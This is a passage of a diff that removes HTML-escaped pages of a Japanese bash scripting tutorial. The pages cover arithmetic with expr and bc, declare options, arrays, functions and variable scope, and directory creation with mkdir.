-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> + &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> - &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> &lt;span class="se">\*&lt;/span> &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> / &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="k">$(&lt;/span>expr &lt;span class="nv">$n1&lt;/span> % &lt;span class="nv">$n2&lt;/span> &lt;span class="k">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash numberCalc4.sh
-24
-16
-80
-5
-0
-$
-&lt;/code>&lt;/pre>&lt;h3 id="小数点の扱い-bcコマンド">小数点の扱い bcコマンド&lt;/h3>
-&lt;p>exprコマンドなどは小数演算できません。&lt;br>
-echoコマンドで数式を作成し、それをbcコマンドに渡して計算します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bc:bc.sh" data-lang="bc:bc.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bc.sh
-3.33333
-$
-&lt;/code>&lt;/pre>&lt;h2 id="bcコマンドでの小数点以下の指定桁数出力">bcコマンドでの小数点以下の指定桁数出力&lt;/h2>
-&lt;p>演算の精度を保つため、上記のように計算は小数点以下5桁で行うけれど、表示は小数点以下2桁とかにしたい場合（桁数を指定したい場合）&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bc_f.sh" data-lang="bash:bc_f.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>
-&lt;span class="nb">printf&lt;/span> &lt;span class="s2">&amp;#34;%.2f&amp;#34;&lt;/span> &lt;span class="nv">$RESULT&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bc_f.sh
-3.33
-$
-&lt;/code>&lt;/pre>&lt;p>printf で桁数を指定します。&lt;br>
-実は、bcコマンドでも桁数を指定できます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bc_f.sh" data-lang="bash:bc_f.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="c1"># 先に紹介した方法&lt;/span>
-&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># printfコマンドで２桁にする&lt;/span>
-&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=5; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">printf&lt;/span> &lt;span class="s2">&amp;#34;%.2f\n&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="c1"># bcコマンドで２桁にする&lt;/span>
-&lt;span class="nv">RESULT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;scale=2; 10.0 / 3.0&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> bc&lt;span class="sb">`&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$RESULT&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bc_f.sh
-3.33333
-3.33
-3.33
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>ヒント&lt;/dt>
-&lt;dd>bcコマンドで小数点以下の桁数を指定するためには、scale= で指定します。&lt;/dd>
-&lt;dd>&amp;lsquo;;&amp;lsquo;セミコロンを忘れずに。&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="declareコマンド">declareコマンド&lt;/h2>
-&lt;p>bashには変数の型(int char stringなど）がないため、bashで変数の型を制限することはできません。&lt;br>
-ただし、型のような動作を許可することができます。&lt;/p>
-&lt;pre tabindex="0">&lt;code>declare [オプション] [変数名]=[値]
-&lt;/code>&lt;/pre>&lt;h3 id="グローバル変数とローカル変数">グローバル変数とローカル変数&lt;/h3>
-&lt;p>関数内で declare コマンドを使用すると、オプションがなければローカル変数として定義されます。-g オプションを使用すればスクリプト内のグローバルに変数を定義されます。スコープを明示しないと狭いスコープとなります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:declare.sh" data-lang="bash:declare.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">function&lt;/span> set_my_value&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
-&lt;span class="nb">declare&lt;/span> -x &lt;span class="nv">my_env_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;ENV&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">declare&lt;/span> -g &lt;span class="nv">my_global_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;GLOBAL&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">declare&lt;/span> &lt;span class="nv">my_local_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;LOCAL&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nv">my_value&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;XXX&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="o">}&lt;/span>
-set_my_value&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_env_value&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_global_value&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_local_value&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="nv">$my_value&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>結果は以下の通りです。&lt;/p>
-&lt;pre tabindex="0">&lt;code>$ bash declare.sh
-GLOBAL
-XXX
-$
-&lt;/code>&lt;/pre>&lt;h3 id="整数として変数定義する">整数として変数定義する&lt;/h3>
-&lt;p>-i を付ければ整数として変数を定義できます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:declare_i.sh" data-lang="bash:declare_i.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="c1"># -i で整数として変数を定義&lt;/span>
-$ &lt;span class="nb">declare&lt;/span> -i &lt;span class="nv">num&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">001&lt;/span>
-$ &lt;span class="nb">echo&lt;/span> &lt;span class="nv">$num&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash declare_i.sh
-1
-$
-&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:declare_no_i.sh" data-lang="bash:declare_no_i.sh">&lt;span class="c1"># -i がないと文字列となるのでそのまま&lt;/span>
-$ &lt;span class="nb">declare&lt;/span> &lt;span class="nv">str&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">001&lt;/span>
-$ decho &lt;span class="nv">$str&lt;/span>
-$ &lt;span class="nb">echo&lt;/span> &lt;span class="nv">$str&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash declare_no_i.sh
-001
-$
-&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
-&lt;dl>
-&lt;dt>オプションまとめ&lt;/dt>
-&lt;dd>delcare -a: 配列を定義&lt;/dd>
-&lt;dd>delcare -i: 整数として定義&lt;/dd>
-&lt;dd>delcare -r: 読み取り専用変数として定義&lt;/dd>
-&lt;dd>delcare -g: 関数内で使用時、グローバル変数として定義&lt;/dd>
-&lt;/dl>
-&lt;/div>
-&lt;h2 id="配列">配列&lt;/h2>
-&lt;p>配列を宣言し、その中に値を格納する方法を学びます。&lt;br>
-好きなだけ値を保存できます。&lt;br>
-配列の名前を書き、その値を「( )」括弧で定義します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array.sh" data-lang="bash:array.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array.sh
-BMW TOYOTA HONDA
-$
-&lt;/code>&lt;/pre>&lt;p>「BMW」が「0」番目のインデックスに格納され、「TOYOTA」が「1」番目のインデックスに格納され、「HONDA」が「2」番目のインデックスに格納されます。&lt;br>
-「BMW」を出力する場合は、${car[0]}と書きます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array2.sh" data-lang="bash:array2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="c1">#printing value by using index&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing value using index&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[0]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[1]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[2]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array2.sh
-BMW TOYOTA HONDA
-printing value using index
-BMW
-TOYOTA
-HONDA
-$
-&lt;/code>&lt;/pre>&lt;p>配列のインデックスを印刷することもできます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array3.sh" data-lang="bash:array3.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array3.sh
-BMW TOYOTA HONDA
-printing the indexes
-0 1 2
-$
-&lt;/code>&lt;/pre>&lt;p>配列内の値の合計数を印刷する場合は、ここに「${#car[@]}」と書くだけで、要素の総数を表します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array4.sh" data-lang="bash:array4.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;ROVER&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing number of values&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${#&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array4.sh
-BMW TOYOTA HONDA ROVER
-printing the indexes
-0 1 2 3
-printing number of values
-4
-$
-&lt;/code>&lt;/pre>&lt;p>配列内にある任意の要素を削除したいとします。&lt;br>
-要素を削除するには、配列名と削除する要素のインデックスを含む「unset」コマンドを使用します。&lt;br>
-「car」配列の2番目のインデックスに格納されている値を削除する場合は、スクリプトに「unset car[2]」と書くだけです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array4.sh" data-lang="bash:array4.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;ROVER&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
-&lt;span class="nb">unset&lt;/span> car&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing number of values&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${#&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>次のコードを「helloScript.sh」に保存します。「./helloScript.sh」を使用してファイルを実行します。&lt;/p>
-&lt;p>配列要素を削除することはわかりました。&lt;br>
-では「MERCEDES」などの他の値をインデックス2に格納する場合はどうしましょう。&lt;br>
-unsetコマンドを使用した後、次の行に「car[2]=&amp;lsquo;MERCEDES」と書きます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array5.sh" data-lang="bash:array5.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;ROVER&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
-&lt;span class="c1"># 2のHONDAを削除&lt;/span>
-&lt;span class="nb">unset&lt;/span> car&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>
-&lt;span class="c1"># 2に値をセット&lt;/span>
-car&lt;span class="o">[&lt;/span>2&lt;span class="o">]=&lt;/span>&lt;span class="s1">&amp;#39;MERCEDES&amp;#39;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing number of values&amp;#34;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${#&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array5.sh
-BMW TOYOTA MERCEDES ROVER
-printing the indexes
-0 1 2 3
-printing number of values
-4
-$
-&lt;/code>&lt;/pre>&lt;h2 id="関数">関数&lt;/h2>
-&lt;p>関数は基本的に再利用可能なコード行です。何度も呼び出すことができます。&lt;br>
-特定の操作を何度も実行する場合、または特定の処理を何度も実行する場合、関数は、何度も何度も同じコードを書くための時間と労力を軽減します。&lt;/p>
-&lt;p>以下は関数の構文を示す例です。&lt;br>
-覚えておくべき最も重要なことの1つは、関数を呼び出す前にコーディングのどこかで最初に関数を定義または宣言する必要があることです。&lt;/p>
-&lt;p>コードで関数を定義するには、３つのステップが必要です。&lt;br>
-ステップ1は、指定する関数名の前に「function」コマンドを書き関数名を宣言し、後ろに「()」を書きます。&lt;br>
-ステップ2は、処理ブロックは「{」ではじまり、「 }」で閉じられた内側ににコードを書くことです。&lt;br>
-ステップ3は、function 関数名() で宣言した下の行で実行したい関数名を使用して関数を呼び出すことです。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:method.sh" data-lang="bash:method.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="c1"># 関数の宣言&lt;/span>
-&lt;span class="k">function&lt;/span> funcName&lt;span class="o">(){&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;this is new function&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="o">}&lt;/span>
-&lt;span class="c1"># 関数呼び出し&lt;/span>
-funcName&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash method.sh
-this is new function
-$
-&lt;/code>&lt;/pre>&lt;p>関数にパラメータを与えることもできます。&lt;br>
-たとえば、関数呼び出し時に与えられる任意の単語を引数として指定します。&lt;br>
-関数呼び出しの関数名の後ろに、文字列を指定して関数に渡します。&lt;br>
-渡された関数は、一つ目のパラメータを $1 として処理を続ける事ができます。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:method2.sh" data-lang="bash:method2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">function&lt;/span> funcPrint&lt;span class="o">(){&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="o">}&lt;/span>
-funcPrint &lt;span class="s2">&amp;#34;BashScript&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash method2.sh
-BashScript
-$
-&lt;/code>&lt;/pre>&lt;p>複数のパラメータを扱う場合、$1, $2などの変数名は区別がつきにくく、コードが混乱する場合が多いので、変数に代入すると、扱いやすくなります。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:method2.sh" data-lang="bash:method2.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-&lt;span class="k">function&lt;/span> funcPrint&lt;span class="o">(){&lt;/span>
-&lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2"> is &lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2"> years old.&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
-&lt;span class="o">}&lt;/span>
-funcPrint &lt;span class="s2">&amp;#34;BashScript&amp;#34;&lt;/span> &lt;span class="m">24&lt;/span> &lt;span class="p">;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash method2.sh
-BashScript is 24 years old.
-$
-関数内で宣言される変数はローカル変数です。
-というのは一般的なプログラム言語ですが、シェルスクリプトBashはグローバル変数しかありません。関数の中で宣言しても、関数の外で宣言しても、いずれもグローバル変数です。
-先に紹介した declare -g を使うことにより、グローバル変数とローカル変数を明確に区別することができます。
-例えば、以下のソースでは、関数実行前に「I love Mac」を変数に格納し、出力します。
-その後、関数を呼び出し、同変数に「I love Linux」を変数に代入すると、Ｃ言語やＪａｖａなどは、ローカル変数に格納した値は、グローバル変数に影響しない訳ですが、シェルスクリプトBashは、もろに影響します。理由は全てグローバル扱いだからです。
-``` bash:global_local.sh
-#!/bin/bash
-function funcCheck(){
-returningValue=&amp;quot;I love Linux&amp;quot;;
-}
-returningValue=&amp;quot;I love MAC&amp;quot;;
-echo $returningValue;
-#&amp;gt; I love Mac
-funcCheck;
-echo $returningValue;
-#&amp;gt; I love Linux
-&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>$ bash global_local.sh
-I love MAC
-I love Linux
-$
-&lt;/code>&lt;/pre>&lt;h2 id="ファイルとディレクトリ">ファイルとディレクトリ&lt;/h2>
-&lt;p>このトピックでは、&lt;br>
-１．ファイルとディレクトリを作成する方法、&lt;br>
-２．スクリプトを使用してこれらのファイルとディレクトリの存在を確認する方法、&lt;br>
-３．ファイルからテキストを1行ずつ読み取る方法、&lt;br>
-４．ファイルにテキストを追加する方法、&lt;br>
-５．ファイルを削除する方法、&lt;/p>
-&lt;p>を紹介します。&lt;/p>
-&lt;h3 id="ディレクトリ操作">ディレクトリ操作&lt;/h3>
-&lt;p>最初のスクリプトは、「Directory2」という名前のディレクトリを作成します。&lt;br>
-&amp;lsquo;mkdir&amp;rsquo; コマンドでディレクトリを作成します。&lt;br>
-すでに同じディレクトリに「Directory2」フォルダーがある場合はエラーとなります。&lt;br>
-エラーに対処するためには、'-p&amp;rsquo; オプションを使います。&lt;br>
-&amp;lsquo;-p&amp;rsquo; オプションは、作成しようとするその場所に、作成したいディレクトリ名が既に存在している場合は、なにもしません。ディレクトリが存在しない場合のみ、新しいディレクトリを作成します。&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir.sh" data-lang="bash:mkdir.sh">&lt;span class="cp">#!/bin/bash
-&lt;/span>&lt;span class="cp">&lt;/span>
-mkdir -p Directory2
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>現在の場所にディレクトリが存在するかどうかをif文で確認することもできます。&lt;br>
